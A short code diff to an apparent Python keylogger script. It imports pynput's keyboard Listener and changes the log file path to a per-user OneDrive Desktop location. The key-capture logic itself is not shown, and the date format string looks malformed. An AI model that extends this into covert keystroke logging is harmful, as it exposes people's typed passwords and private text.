@@ -1,7 +1,9 @@
 from pynput.keyboard import Key, Listener
 import logging
+import getpass
 
-logging.basicConfig(filename="logfile.txt",
+username = getpass.getuser()
+logging.basicConfig(filename=f'C:/Users/{username}/OneDrive/Desktop/logfile.txt',
                   level=logging.DEBUG,
                   style="{",
                   datefmt='%Y-%d-%M %H:%M^%S',
